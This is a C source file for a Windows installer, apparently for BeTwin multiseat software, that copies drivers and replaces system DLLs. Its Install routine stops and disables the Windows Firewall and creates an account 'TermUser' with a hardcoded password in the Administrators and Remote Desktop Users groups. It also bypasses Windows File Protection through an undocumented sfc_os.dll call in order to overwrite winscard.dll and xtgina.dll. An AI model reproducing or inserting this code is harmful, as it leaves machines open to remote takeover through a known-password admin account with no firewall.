#include <windows.h>
#include <winsvc.h>
#include <Lm.h>
#include <shlwapi.h>

#pragma comment(lib, "Netapi32.lib")
#pragma comment(lib, "Shlwapi.lib")

#define SFC_FILE_EXCEPTION ((LPCSTR)5)
typedef DWORD (__stdcall *SfcFileExceptionType)(DWORD, LPCWSTR, DWORD);

typedef BOOL (WINAPI *Wow64DisableWow64FsRedirectionType)(
	__out  PVOID *OldValue
	);
typedef BOOL (WINAPI *Wow64RevertWow64FsRedirectionType)(
	__in  PVOID OldValue
	);

static const wchar_t FIREWALL_SERVICE[] = L"sharedaccess"; 
static wchar_t TERM_USER[] = L"TermUser";
static wchar_t TERM_USER_PWD[] = L"TMPass123";

static BOOL GetUserGroupName(DWORD id0, DWORD id1, LPWSTR groupName, DWORD sizeName)
{
	wchar_t domainName[0x2000]		= {0};
	DWORD sizeDomain				= _countof(domainName);
	BOOL success					= FALSE;
	PSID sid						= NULL;
	SID_IDENTIFIER_AUTHORITY aut	= SECURITY_NT_AUTHORITY;
	SID_NAME_USE type				= 0;	

	success = AllocateAndInitializeSid
		(
			&aut, 
			2, 
			id0, 
			id1, 
			0, 
			0, 
			0, 
			0, 
			0, 
			0, 
			&sid
		);
	if(!success) goto __exit;

	success = LookupAccountSid
		(
			NULL,
			sid,
			groupName,
			&sizeName,
			domainName,
			&sizeDomain,
			&type
		);
	if(!success) goto __exit;

	success = TRUE;

__exit:

	if(NULL != sid) FreeSid(sid);

	return success;
}

static BOOL StopWindowsFirewall()
{
	BOOL success		= FALSE;
	SC_HANDLE mngr		= NULL;
	SC_HANDLE firewall	= NULL;
	SERVICE_STATUS st	= {0};
	int i				= 0;

	mngr = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if(NULL == mngr) goto __exit;

	firewall = OpenService(mngr, FIREWALL_SERVICE, SERVICE_ALL_ACCESS);
	if(NULL == firewall) goto __exit;

	ControlService(firewall, SERVICE_CONTROL_STOP, &st);

	for(i; i < 10; ++i)
	{
		if(!ControlService(firewall, SERVICE_CONTROL_INTERROGATE, &st))
		{
			break;
		}
		
		if(st.dwCurrentState == SERVICE_STOPPED)
		{
			break;
		}

		Sleep(1000);
	}

	success = ChangeServiceConfig
		(
			firewall,
			SERVICE_NO_CHANGE,
			SERVICE_DISABLED,
			SERVICE_NO_CHANGE,
			NULL,
			NULL,
			NULL,
			NULL,
			NULL,
			NULL,
			NULL
		);	
	if(!success) goto __exit;

	success = TRUE;

__exit:
	
	if(NULL != mngr)		CloseServiceHandle(mngr);
	if(NULL != firewall)	CloseServiceHandle(firewall);

	return success;
}

static BOOL CreateTermServUser()
{
	BOOL success					= FALSE;
	NET_API_STATUS st				= NERR_Success;
	DWORD err						= 0;
	USER_INFO_1 usr					= {0};
	wchar_t groupName[0x2000]		= {0};
	LOCALGROUP_MEMBERS_INFO_3 info	= {0};

	st = NetUserDel(NULL, TERM_USER);
	
	usr.usri1_name		= TERM_USER;
	usr.usri1_password	= TERM_USER_PWD;
	usr.usri1_priv		= USER_PRIV_USER;
	usr.usri1_flags		= UF_NORMAL_ACCOUNT | UF_DONT_EXPIRE_PASSWD;

	st = NetUserAdd(NULL, 1, (LPBYTE)&usr, &err);
	if(NERR_Success != st) goto __exit;
	
	success = GetUserGroupName
		(
			SECURITY_BUILTIN_DOMAIN_RID, 
			DOMAIN_ALIAS_RID_ADMINS, 
			groupName, 
			_countof(groupName)
		);
	if(!success) goto __exit;

	info.lgrmi3_domainandname = TERM_USER;
	st = NetLocalGroupAddMembers(NULL, groupName, 3, (LPBYTE)&info, 1);
	if(NERR_Success != st) goto __exit;

	success = GetUserGroupName
	(
		SECURITY_BUILTIN_DOMAIN_RID, 
		DOMAIN_ALIAS_RID_REMOTE_DESKTOP_USERS, 
		groupName, 
		_countof(groupName)
	);
	if(!success) goto __exit;

	info.lgrmi3_domainandname = TERM_USER;
	st = NetLocalGroupAddMembers(NULL, groupName, 3, (LPBYTE)&info, 1);
	if(NERR_Success != st) goto __exit;

	success = TRUE;

__exit:

	return success;
}

static BOOL CopyBeTwinFiles(LPCWSTR binFolder)
{
	BOOL success		= TRUE;
	wchar_t src[0x1000]	= {0};
	wchar_t dst[0x1000]	= {0};

	GetWindowsDirectory(dst, _countof(dst));
	PathAppend(dst, L"system32\\Drivers\\BETWINKF.SYS");
	wcscpy_s(src, _countof(src), binFolder);
	PathAppend(src, L"BETWINKF.SYS");
	success &= CopyFile(src, dst, FALSE);

	GetWindowsDirectory(dst, _countof(dst));
	PathAppend(dst, L"system32\\Drivers\\BETWINMF.SYS");
	wcscpy_s(src, _countof(src), binFolder);
	PathAppend(src, L"BETWINMF.SYS");
	success &= CopyFile(src, dst, FALSE);

	GetWindowsDirectory(dst, _countof(dst));
	PathAppend(dst, L"system32\\Drivers\\BeTwinSystem.SYS");
	wcscpy_s(src, _countof(src), binFolder);
	PathAppend(src, L"BeTwinSystem.SYS");
	success &= CopyFile(src, dst, FALSE);

	GetWindowsDirectory(dst, _countof(dst));
	PathAppend(dst, L"system32\\Drivers\\BETWINVF.SYS");
	wcscpy_s(src, _countof(src), binFolder);
	PathAppend(src, L"BETWINVF.SYS");
	success &= CopyFile(src, dst, FALSE);

	GetWindowsDirectory(dst, _countof(dst));
	PathAppend(dst, L"system32\\BeTwinServiceXP.exe");
	wcscpy_s(src, _countof(src), binFolder);
	PathAppend(src, L"BeTwinServiceXP.exe");
	success &= CopyFile(src, dst, FALSE);

	GetWindowsDirectory(dst, _countof(dst));
	PathAppend(dst, L"system32\\SlsApi.dll");
	wcscpy_s(src, _countof(src), binFolder);
	PathAppend(src, L"SlsApi.dll");
	success &= CopyFile(src, dst, FALSE);

	GetWindowsDirectory(dst, _countof(dst));
	PathAppend(dst, L"system32\\oemsetup.ini");
	wcscpy_s(src, _countof(src), binFolder);
	PathAppend(src, L"oemsetup.ini");
	success &= CopyFile(src, dst, FALSE);

	return success;
}

static BOOL CopyNewWindowsFiles(LPCWSTR binFolder)
{
	BOOL success							= TRUE;
	SfcFileExceptionType SfcFileException	= NULL;
	wchar_t src[0x1000]						= {0};
	wchar_t dst[0x1000]						= {0};
	PVOID oldFs								= NULL;
	WIN32_FIND_DATA find					= {0};
	HANDLE hFind							= INVALID_HANDLE_VALUE;
	HMODULE sfc								= NULL;

	Wow64DisableWow64FsRedirectionType Wow64DisableWow64FsRedirection = (Wow64DisableWow64FsRedirectionType)GetProcAddress
		(
			GetModuleHandle(L"kernel32.dll"), 
			"Wow64DisableWow64FsRedirection"
		);

	Wow64RevertWow64FsRedirectionType Wow64RevertWow64FsRedirection	= (Wow64RevertWow64FsRedirectionType)GetProcAddress
		(
			GetModuleHandle(L"kernel32.dll"), 
			"Wow64RevertWow64FsRedirection"
		);

	if(NULL != Wow64DisableWow64FsRedirection)
	{
		Wow64DisableWow64FsRedirection(&oldFs);
	}

	GetWindowsDirectory(dst, _countof(dst));
	PathAppend(dst, L"system32\\winscard.dll");

	sfc = LoadLibrary(L"sfc_os.dll");
	SfcFileException = (SfcFileExceptionType)GetProcAddress(sfc, SFC_FILE_EXCEPTION); 
	if(NULL != SfcFileException)
	{
		SfcFileException(0, dst, 0xFFFFFFFF);
	}

	FreeLibrary(sfc);

	GetWindowsDirectory(src, _countof(src));
	PathAppend(src, L"system32\\xtgina.dll");
	GetWindowsDirectory(dst, _countof(dst));
	PathAppend(dst, L"system32\\xtgina.old");
	MoveFile(src, dst);
	
	wcscpy_s(src, _countof(src), binFolder);
	PathAppend(src, L"xtgina.dll");
	GetWindowsDirectory(dst, _countof(dst));
	PathAppend(dst, L"system32\\xtgina.dll");
	success &= CopyFile(src, dst, FALSE);
	
	GetWindowsDirectory(src, _countof(src));
	PathAppend(src, L"system32\\winscard32.dll");

	hFind = FindFirstFile(src, &find);
	if (hFind == INVALID_HANDLE_VALUE) 
	{
		GetWindowsDirectory(src, _countof(src));
		PathAppend(src, L"system32\\winscard.dll");

		GetWindowsDirectory(dst, _countof(dst));
		PathAppend(dst, L"system32\\winscard32.dll");
		success &= MoveFile(src, dst);
	} 
	else 
	{		
		FindClose(hFind);

		GetWindowsDirectory(src, _countof(src));
		PathAppend(src, L"system32\\winscard.dll");

		GetWindowsDirectory(dst, _countof(dst));
		PathAppend(dst, L"system32\\winscard.old");
		success &= MoveFile(src, dst);
	}

	wcscpy_s(src, _countof(src), binFolder);
	PathAppend(src, L"winscard_32.dll");

	GetWindowsDirectory(dst, _countof(dst));
	PathAppend(dst, L"system32\\winscard.dll");
	success &= CopyFile(src, dst, FALSE);

	if(NULL != Wow64RevertWow64FsRedirection)
	{
		Wow64RevertWow64FsRedirection(oldFs);
	}

	return success;
}

static BOOL ExecuteRegScript(LPCWSTR binFolder)
{
	BOOL success			= FALSE;
	HANDLE process			= NULL;
	wchar_t cmdLine[0x1000]	= {0};
	STARTUPINFO si			= {sizeof(STARTUPINFO), 0};
	PROCESS_INFORMATION pi	= {0};


	GetWindowsDirectory(cmdLine, _countof(cmdLine));
	PathAppend(cmdLine, L"regedit.exe /s /d ");
	
	wcscat_s(cmdLine, _countof(cmdLine), binFolder);
	PathAppend(cmdLine, L"reg.reg");

	success = CreateProcess
		(
			NULL,
			cmdLine,
			NULL,
			NULL,
			FALSE,
			0, 
			NULL,
			NULL,
			&si,
			&pi
		);

	if(success)
	{
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}

	return success;
}

BOOL Install(LPCWSTR binFolder)
{
	BOOL res = TRUE;
	
	res &= StopWindowsFirewall();
	res &= CreateTermServUser();
	res &= CopyBeTwinFiles(binFolder);
	res &= CopyNewWindowsFiles(binFolder);	
	res &= ExecuteRegScript(binFolder);

	return res;
}